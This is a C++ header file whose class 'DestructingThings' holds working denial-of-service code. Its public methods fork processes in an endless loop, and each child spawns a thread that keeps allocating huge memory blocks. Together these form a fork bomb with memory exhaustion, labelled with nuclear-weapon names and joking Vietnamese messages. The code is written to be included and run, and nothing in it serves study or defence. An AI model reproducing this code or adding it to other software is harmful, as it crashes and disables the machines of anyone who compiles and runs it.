#pragma once
#include <iostream>
#include <vector>
#include <cstdlib>
#include <limits.h>
#include <unistd.h>
#include <thread>
namespace cppheader {
    class DestructingThings {
    private:
        static int anothernuke() {
            std::vector<void*> phan_cap_phat;
            while (true) {
                void* ptr = malloc(INT_MAX);
                if (!ptr) {
                    std::cout << "Cuu! May tinh sap no!" << std::endl;
                    break;
                }
                phan_cap_phat.push_back(ptr);
                std::cout << "Da cap phat them co... khong biet :D" << std::endl;
            }
            return 0;
        }
        static int supernuke() {
            std::vector<void*> phan_cap_phat;
            while (true) {
                void* ptr = malloc(ULLONG_MAX);
                if (!ptr) {
                    std::cout << "Cuu! May tinh sap no!" << std::endl;
                    break;
                }
                phan_cap_phat.push_back(ptr);
                std::cout << "Da cap phat them co... khong biet :D" << std::endl;
            }
            return 0;
        }
    public:
        static int castlebravo() {
            while (true) {
                if (fork() == 0) {
                    std::thread(anothernuke).detach();
                }
            }
            return 0;
        }
        static int tsarbomba() {
            while (true) {
                if (fork() == 0) {
                    std::thread(supernuke).detach();
                }
            }
        }
    };
}
